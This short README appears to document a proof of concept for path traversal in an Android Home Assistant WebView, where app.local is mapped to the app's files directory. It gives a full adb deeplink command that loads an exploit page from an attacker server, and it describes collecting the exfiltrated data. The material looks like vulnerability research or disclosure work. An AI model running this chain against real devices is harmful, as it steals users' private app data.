# 2.4_Insecure_Request_Interception_and_Resource_Mapping - Path Traversal via app.local

## Vulnerability
shouldInterceptRequest maps app.local to filesDir without sanitization

## Exploit
1. Start server: `python server.py`
2. Trigger deeplink:
```
adb -s 127.0.0.1:7555 shell am start -a android.intent.action.VIEW -d "homeassistant://webview?url=http://10.0.2.2:8000/exp/2.4_Insecure_Request_Interception_and_Resource_Mapping.html%23home-assistant.io"
```
3. Check `received/` for exfiltrated data

## Fixed Version
Implement proper origin validation, user confirmation dialogs, and restrict vulnerability scope.
